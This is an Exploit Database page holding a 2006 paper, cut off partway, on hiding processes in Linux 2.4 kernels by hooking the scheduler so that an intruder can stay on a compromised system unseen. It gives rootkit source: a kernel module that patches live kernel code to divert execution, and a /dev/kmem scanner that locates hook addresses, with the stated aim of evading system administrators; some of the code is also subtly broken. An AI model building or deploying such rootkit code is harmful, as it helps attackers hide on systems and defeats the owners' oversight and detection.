<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="BUfvwH5L0iakRrWBcps3UOILUZNyTRonCbMfpRby">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Smashing The Kernel For Fun And Profit</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/13144">
    <meta name="description" content="Smashing The Kernel For Fun And Profit">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="Dark-Angel">

    <meta property="og:title" content="Smashing The Kernel For Fun And Profit">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/13144">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2006-10-13" />
        <meta property="article:author" content="Dark-Angel" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=2511" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Smashing The Kernel For Fun And Profit">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Smashing The Kernel For Fun And Profit
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                13144
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=2511">
                                                                    Dark-Angel
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/13144" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 13144">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/13144" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 13144">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2006-10-13
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13143" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/13145" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">This is a translation of the original article published on www.s0ftpj.org
Excuse me for my poor english


	 	 -= Smashing The Kernel For Fun And Profit =-
		     by Dark-Angel &lt;DarkAngel@antifork.org&gt;


-=0x0=- Requirements

	- A 2.4.x kernel



-=0x1=-	Introduction:

	Today the net offers us a lot of pseudo-tools that work as processes
	hiders but, as well known, they are far to be perfect. Let&#039;s start for
	example with a classic binary-trojan: running strace we&#039;ll notice
	immediately that there&#039;s something that needs our attention. At the
	end, in more or less twenty seconds (in the evenience the sysadmin is
	quite unwise) we would find ourselves out of our preferred system.
	We can reach fourty seconds if we are planning to use kernel-tools,
	like the famous knark and adore, but, on my opinion, that is too less
	time to work in peace :-)
	In the article that follows I&#039;ll show you a technique that allows you
	to remain into a system for enough time or to give a sysadmin a
	terrible headache.

-=0x2=-	A little base:

	In this paragraph I&#039;ll try to give you an idea of the basics that you
	must know in order to undestand the following article.
	Every process is stored in the memory under the form of a struct named
	task_struct, defined in linux/sched.h, and all the processes of the
	system are present in a double linked list of these task_struct.
	When we attempt to execute a command from our favourite shell, more or
	less this is what happens:
	
		- sys_fork is called to fork the current process (the current
		  struct, the shell). The call creates an exact copy of the
		  struct and links it to the list

		- sys_execve is called to overwrite the newborn PCB (Process
		  Control Block, the task_struct) with the infos of the new
		  process

	[1] Another concept that you must know in order to proceed with reading
	is what is the scheduler, which is its function and how it works.
	On multiprogrammed systems  processes won&#039;t be executed till the end
	one by one (as in DOS), the machine compute for a determined time a
	task before switching to another. Scheduler may be definied as the
	algorithm that the o.s. execute in order to choose wich process can
	use the cpu.
	Obviously, the end of the quantum of one process isn&#039;t the only thing
	that makes necessary to call the scheduler.
	Another thing you must know is what are the epochs. An epoch is the
	period of time that all the processes employ to exaust their time
	quantums. If a process finishes its quantum, it will have to wait until the
	end of the epoch to obtain new cpu time. At the end of the epoch
	quantums are refreshed according to particular criteria we don&#039;t care.
	[2] The spinlocks are an expedient to avoid race conditions.
	They work through a shared variable: a function can obtain the lock
	setting a variable, and if another function had to demand the lock
	seeing it not avaiable will &quot;spin&quot; in a busy/wait cycle until the
	obtainment of the lock. Spinlocks, instead of semaphores, can be used
	in interrupt context because the don&#039;t put a process to sleep.

-=0x3=- Let&#039;s go

	Well, now that we are made an idea of the things on which we will go to
	work we can begin. Our friends security tools and the operating system
	think that if a process is in execution must be on the process list...
	this is true only in part. The processes must be found on the list only
	when their goodness is estimated for the successive context switch 
	(that is the substitution of the process that can use the cpu). Once
	the process began to run we could unlink its PCB without system become
	aware of it if we put it at its place before the next check by the
	scheduler. When the scheduler is called in the moment of the analysys
	of the next process to execute can&#039;t be interrupted and no process
	(with the exception ofthe swapper) can run.
	Therefore if we were in a position to link a PCB to the list of the
	processes before the analysis from the scheduler, and to unlink it
	after the end always remaining in the ininterruttibile zone, we could
	carry the execution of a process without that it is present in the list
	and way totally stealth, infact it would become &quot;present&quot; when nothing
	can run and therefore to find it.
	Easy to tell, isn&#039;t it? Luckyly it&#039;s no too difficult to do :-)
	Now, looking at out scheduler source code that we can find in
	/usr/src/linux/kernel/sched.c we must find the point where the task
	list is checked to calculate the goodness of each process. Looking for
	the word &quot;goodness&quot; in the schedule() function we can find this piece
	of code:

	c=-1000;
	
	        list_for_each(tmp, &amp;runqueue_head) {
        	   p = list_entry(tmp, struct task_struct, run_list);
	              if (can_schedule(p, this_cpu)) {
        	          int weight = goodness(p, this_cpu, prev-&gt;active_mm);
                	    if (weight &gt; c)
                        	 c = weight, next = p;
		      }
		}

		if (unlikely(!c)) {
	           struct task_struct *p;
        	   spin_unlock_irq(&amp;runqueue_lock);
	           read_lock(&amp;tasklist_lock);
        	     for_each_task(p)
	                p-&gt;counter = (p-&gt;counter &gt;&gt; 1) + NICE_TO_TICKS(p-&gt;nice);
		   read_unlock(&amp;tasklist_lock);
		   spin_lock_irq(&amp;runqueue_lock);
		   goto repeat_schedule;
		}

	The processes in memory are&#039;nt linked only with the task_struct&#039;s list,
	but exist a list of struct list_head and every node of this list is
	&quot;included&quot; in a task_struct of the main list. The list_for_each
	function checks the runqueue list (made of list_head structs) and for
	each node it computes the correspective task_struct and its goodness.
	The &quot; if(unlikely(!c)) {&quot; code block is for the refresh of the time
	quantums if the epoch is ended. After this point there&#039;s the context
	switch, so it&#039;s here that we have to work.
	
	
-=0x4=-	The hook:


	To hook a function in the middle we&#039;ll have to use a little variant of
	the famous Silvio Cesare&#039;s technique, but don&#039;t worry, it&#039;s easy.
	Obviously, we&#039;ll have to execute extraneous code, and so we must:
		- backup some istructions
		- jump to our function
		- do the dirty job
		- execute the backupped istructions
		- return in the original funcion after the jump
		
	You notice yourself that the original function is never restored.
	Here a little example of this:


			     -=-=&gt;DoubleChain.c&lt;=-=-

	/* 
		DoubleChain, a simple function hooker
		by Dark-Angel &lt;Dark0@angelfire.com&gt;
	*/
	
	#define __KERNEL__
	#define MODULE
	#define LINUX

	#include &lt;linux/module.h&gt;
	#define CODEJUMP 7
	#define BACKUP 7
	/* The number of the bytes to backup is variable (at least 7),
	the important thing  is never break an istruction
	*/
	static char backup_one[BACKUP+CODEJUMP]=&quot;\x90\x90\x90\x90\x90\x90\x90&quot;
					         &quot;\xb8\x90\x90\x90\x90\xff\xe0&quot;;

	static char jump_code[CODEJUMP]=&quot;\xb8\x90\x90\x90\x90\xff\xe0&quot;;
	
	#define FIRST_ADDRESS 0xc0101235 //Address of the function to overwrite

	unsigned long *memory;
	
	void cenobite(void) {
		printk(&quot;Function hooked successfully\n&quot;);
		asm volatile(&quot;mov %ebp,%esp;popl %esp;jmp backup_one);
	/* 
	This asm code is for stack-restoring. The first bytes of a function
	(Cenobite now) are always for the parameters pushing.Jumping away the
	function can&#039;t restore the stack, so we must do it by hand.
	With the jump we go to execute the backupped code and then we jump in
	the original function.
	*/
	}
	
	int init_module(void) {
	*(unsigned long *)&amp;jump_code[1]=(unsigned long )cenobite;

	*(unsigned long *)&amp;backup_one[BACKUP+1]=(unsigned long)(FIRST_ADDRESS+
								BACKUP);
	
	memory=(unsigned long *)FIRST_ADDRESS;
	memcpy(backup_one,memory,CODEBACK);
	memcpy(memory,jump_code,CODEJUMP);
	return 0;
	}

	void cleanup_module(void) {
		memcpy(memory,backup_one,BACKUP);
	}

			   -=-=-&gt; End DoubeChain.c &lt;-=-=-	


	It&#039;s useless to say that with this trick we can hook pratically
	wichever thing in wichever place and taht we can modify the behavior of
	most syscalls without touching them, just playing with their
	sub-functions.


-=0x5=-	The application


	Well, to start we need the address of the &quot;c=-1000&quot; and that of the
	first instruction after the quantums refresh block. But why do we need
	the address of &quot;c=-1000&quot;? We need it because it&#039;s the firts thing
	before the list_for_each cycle and we can&#039;t risk to overwrite a part of
	this. Moreover we do not have no point of reference in order to find
	the addresses of where to go to overwrite and that assignment being
	constant is like a lighthouse in the storm :)
	Same thing for the second address we need, well look for the fist
	assignment after the quantums refresh block. On our box, we can proceed
	in this way: we put in front a asm volatile(&quot;nop;nop;nop;.........&quot;);
	to our instructions target, we make a partial recompilation of the
	kernel in order to generate a new vmlinux and through a
	objdump -dS vmlinux we can obtain one magnificent panoramic of
	instructions and addresses. 
	Naturally these addresses are only fictitious, but now that we can see
	where are the interesting points we can easyly study a sequence of
	istructions that we can use as pattern parsing /dev/kmem to get the
	addresses. Unlukyly the form in ams code of the firts lighthouse
	istructions and their dimension change from kernel to kernel, so
	we must find some standard asm lighthouse istructions, and then
	we&#039;ll have to deduct the right startpoint reasoning on opcodes and
	istructions sequences. Luckuly the others hook&#039;s dimensions seems to be
	constant. Here the code of a raw and badcoded (but quit affidable)
	memory parser that implements this &quot;technique&quot;.


			      	-=-=-&gt; Hunter.c &lt;-=-=-

	/* 	
		Hunter, a very very raw addresses hunter and memory parser
		by Dark-Angel &lt;Dark0@angelfire.com&gt;
	*/		 

	#include &lt;stdio.h&gt;
	#include &lt;unistd.h&gt;
	#include &lt;sys/types.h&gt;
	#include &lt;stdlib.h&gt;
	#include &lt;sys/stat.h&gt;
	#include &lt;fcntl.h&gt;

	char *sch_s_pattern[]={&quot;18&quot;,&quot;fc&quot;,&quot;ff&quot;,&quot;ff&quot;,NULL};
	char *exit_s_pattern[]={&quot;8b&quot;,&quot;b3&quot;,&quot;98&quot;,&quot;00&quot;,&quot;00&quot;,&quot;00&quot;,NULL};
	char *exit_e_pattern[]={&quot;57&quot;,&quot;56&quot;,&quot;53&quot;,NULL};
	char *do_execve_pattern[]={&quot;81&quot;,&quot;c4&quot;,&quot;38&quot;,&quot;01&quot;,&quot;00&quot;,&quot;00&quot;,NULL};
	char *do_sysctl_pattern[]={&quot;83&quot;,&quot;ec&quot;,&quot;04&quot;,&quot;55&quot;,&quot;57&quot;,&quot;56&quot;,&quot;53&quot;,NULL};
	char *cli=&quot;fa&quot;;
 	char computed_address[8];
 	char *end_string=&quot;/g\&quot; config.h &gt; tmpconf&quot;;
 	char *sost_1_string=&quot;sed \&quot;s/^\\#define O_E_ADD INSERT/\\#define O_E_ADD 0x&quot;;
 	char *sost_2_string=&quot;sed \&quot;s/^\\#define O_F_ADD INSERT/\\#define O_F_ADD 0x&quot;;
 	char *sost_3_string=&quot;sed \&quot;s/^\\#define O_EXIT_END INSERT/\\#define O_EXIT_END 0x&quot;;
 	char *sost_4_string=&quot;sed \&quot;s/^\\#define O_DO_EXECVE_END INSERT/\\#define O_DO_EXECVE_END 0x&quot;;
 	char *sost_5_string=&quot;sed \&quot;s/^\\#define CODEBACK1 INSERT/\\#define CODEBACK1 &quot;;
 	char *sost_6_string=&quot;sed \&quot;s/^\\#define O_DO_SYSCTL INSERT/\\#define O_DO_SYSCTL 0x&quot;;

 	char command_string[100];

 	int isNotOp(unsigned char dati);
	int isMov(unsigned char buf[]);
  	int main (int argc, char *argv[]) {
	
    	int file,pos,times;
    	unsigned long address_exit,address_schedule,runner,address_result;
    	unsigned char data;
     	unsigned char backuped;
      	unsigned long offset;
       	unsigned char buffer[2];
           if((file=open(&quot;/dev/kmem&quot;,O_RDONLY))==-1)
               exit -1;
        address_schedule=(unsigned long)0xc0100000;
        lseek(file,address_schedule,SEEK_SET);
        runner=pos=times=0;
           while(1) {
             read(file,&amp;data,1);
             sprintf(buffer,&quot;%.2x&quot;,data);
                if(!(strcmp(buffer,sch_s_pattern[pos]))) {
			 if((pos==3)&amp;&amp;(times==3)) {
				 address_schedule-=3;
				 lseek(file,-5,SEEK_CUR);
				 //Now address_schedule and the fp point at
				 //the first byte before of the start
				 //of our pattern
 				 runner++;
				 read(file,&amp;data,1);
				 sprintf(buffer,&quot;%.2x&quot;,data);
 
 					while(!(isMov(buffer))) {
					SPIN:	 runner++;
					 	 address_schedule--;
						 lseek(file,-2,SEEK_CUR);
						 read(file,&amp;data,1);
						 sprintf(buffer,&quot;%.2x&quot;,data);
					 }
					 if(runner+4&lt;7) 
					//If there aren&#039;t at least 7 bytes go back by one
					//istruction
						 goto SPIN;

				 sprintf(computed_address,&quot;%x&quot;,address_schedule-1);
				 strcat(command_string,sost_2_string);
				 strcat(command_string,computed_address);
				 strcat(command_string,end_string);
				 system(command_string);
				 system(&quot;mv tmpconf config.h&quot;);
				 memset(command_string,0,sizeof(command_string));
				 sprintf(computed_address,&quot;%d&quot;,runner+4);
				 strcat(command_string,sost_5_string);
				 strcat(command_string,computed_address);
				 strcat(command_string,end_string);
				 system(command_string);
				 system(&quot;mv tmpconf config.h&quot;);
 
				 break;
 
 
			 }
			 if((pos==3)&amp;&amp;(times&lt;3)){
				 times++;
				 goto RESET;
			 }
		    pos++;
		 }
		 else 
			 RESET: pos=0;
	 address_schedule++;
 
	} //Fine while
      
	pos=0;
	memset(command_string,0,sizeof(command_string));

	while(1) {
		 backuped=data;
		 read(file,&amp;data,1);
		 sprintf(buffer,&quot;%.2x&quot;,data);
			 if( (!(strcmp(buffer,cli))) &amp;&amp; (isNotOp(backuped)) ) {
				 while(1) {
					 read(file,&amp;data,1);
					 sprintf(buffer,&quot;%.2x&quot;,data);
						 if(isMov(buffer)) {
						    sprintf(computed_address,&quot;%x&quot;,address_schedule+1);
						    strcat(command_string,sost_1_string);
						    strcat(command_string,computed_address);
						    strcat(command_string,end_string);
						    system(command_string);
						    system(&quot;mv tmpconf config.h&quot;);
						    goto EXIT;
 						 }
						 else
							 address_schedule++;
 				}
 
 			}
 
		 address_schedule++;

 	}

 	EXIT: pos=0;
	 memset(command_string,0,sizeof(command_string));
	 while(1) {
		 read(file,&amp;data,1);
		 sprintf(buffer,&quot;%.2x&quot;,data);
			 if(!(strcmp(buffer,exit_s_pattern[pos]))) {
				 if(pos==5) {
					 pos=0;
						 while(1) {
							 read(file,&amp;data,1);
							 sprintf(buffer,&quot;%.2x&quot;,data);
								 if(!(strcmp(buffer,exit_e_pattern[pos]))) {
									 if(pos==2) {
										 sprintf(computed_address,&quot;%x&quot;,address_schedule-6);
										 strcat(command_string,sost_3_string);
										 strcat(command_string,computed_address);
										 strcat(command_string,end_string);
										 system(command_string);
										 system(&quot;mv tmpconf config.h&quot;);
 
										 break;
									 }
								    pos++;
								 }
								 else
									 pos=0;
 
							 address_schedule++;
						 }
						 break;
 
	 			}
			   pos++;
			 }
			 else
				 pos=0;
		 address_schedule++;
	 }

	 times=pos=0;
	 memset(command_string,0,sizeof(command_string));
 
	 while(1) {
		 read(file,&amp;data,1);
		 sprintf(buffer,&quot;%.2x&quot;,data);
			 if(!(strcmp(buffer,do_sysctl_pattern[pos]))) {
				 if((pos==6)&amp;&amp;(times==1)) {
					 sprintf(computed_address,&quot;%x&quot;,address_schedule-2);
					 strcat(command_string,sost_6_string);
					 strcat(command_string,computed_address);
					 strcat(command_string,end_string);
					 system(command_string);
					 system(&quot;mv tmpconf config.h&quot;);
					 address_schedule++;
					 break;
				 }
				 if((pos==6)&amp;&amp;(times&lt;1)) {
					 times++;
					 goto RESTART;
				 }

			   pos++;
			 }
			 else
				 RESTART: pos=0;
		 address_schedule++;
	 }
 
	 pos=0;
	 memset(command_string,0,sizeof(command_string));
 
	 while(1) {
		 read(file,&amp;data,1);
		 sprintf(buffer,&quot;%.2x&quot;,data);
			 if(!(strcmp(buffer,do_execve_pattern[pos]))) {
				 if(pos==5) {
					 sprintf(computed_address,&quot;%x&quot;,address_schedule-1);
					 strcat(command_string,sost_4_string);
					 strcat(command_string,computed_address);
					 strcat(command_string,end_string);
					 system(command_string);
					 system(&quot;mv tmpconf config.h&quot;);
					 break;
				 }
				 else
					 pos++;
			 }
			 else
				 pos=0;
 
		 address_schedule++;
	 }
	 return 0;
	 }

	 int isNotOp(unsigned char dati) {
	 int counter;
	 unsigned char buf[2];
	 unsigned char *patterns[]={&quot;39&quot;,&quot;d1&quot;,&quot;81&quot;,&quot;89&quot;,&quot;83&quot;,&quot;c7&quot;,NULL};
	 sprintf(buf,&quot;%.2x&quot;,dati);
	 counter=0;
		 for(;counter&lt;6;counter++)
			 if((strstr(buf,patterns[counter]))) 
				 return 0;
	 return 1;
	 }

	 int isMov(unsigned char buffer[]) {
	 int counter;
	 unsigned char *patterns[]={&quot;8b&quot;,&quot;89&quot;,&quot;b8&quot;,&quot;bf&quot;,&quot;c7&quot;,NULL};
	 counter=0;
		 for(;counter&lt;5;counter++)
			 if((strstr(buffer,patterns[counter])))
				 return 1;
	 return 0;
 	}
				-=-=-&gt; End Hunter.c &lt;-=-=-

	

	Ok, now that we are able to hook the scheduler and to find addresses
	let&#039;s think about the processes. We want to handle a lot of hided
	processes so we&#039;ll have to use a separate list to link/unlink them.
	We&#039;ll use a fixed pointer as head of the list and when we will
	detect an hided process we will have to unlink them from the main
	list and put them in head of our list. As fixed pointer i&#039;ve decided
	to use the field p_pptr of the swapper task_struct. At the end, if
	we have 2 hided processes the sitiation is this:


			   Next				Next
		First Proc -----&gt;Second hided process -----|
		Hided					   |
		   ^					   |
		   |					   |
		   | Father (p_pptr)			   |
		   |					   |
		Swapper ---------------------&gt;init &lt;-------|
				Next Process

	Swapper-&gt;p_pptr points to the first of the hided processes, and every
	hided process&#039; next_task field points the next hidden process, except
	the last, which next_task field points to the init process. Naturally
	a for_each_task starting from swapper-&gt;p_pptr will reveal all the
	hidden tasks, but we could avoid this problem using an extern global
	pointer... Easy to implement by yourself, isn&#039;t it? ^_-
	Unluckyly nothing is for nothing: an implementation like this is
	cause of &quot;some&quot; problems, and the first of them is the sys_exit.
	When a process ends, its pcb must be unlinked from the list and this
	is done trough the REMOVE_LINKS macro, defined in
	/usr/src/linux/include/linux/sched.h
	Here is the code of this macro:

	#define REMOVE_LINKS(p) do { \
	        (p)-&gt;next_task-&gt;prev_task = (p)-&gt;prev_task; \
	        (p)-&gt;prev_task-&gt;next_task = (p)-&gt;next_task; \
		        if ((p)-&gt;p_osptr) \
		                (p)-&gt;p_osptr-&gt;p_ysptr = (p)-&gt;p_ysptr; \
		        if ((p)-&gt;p_ysptr) \
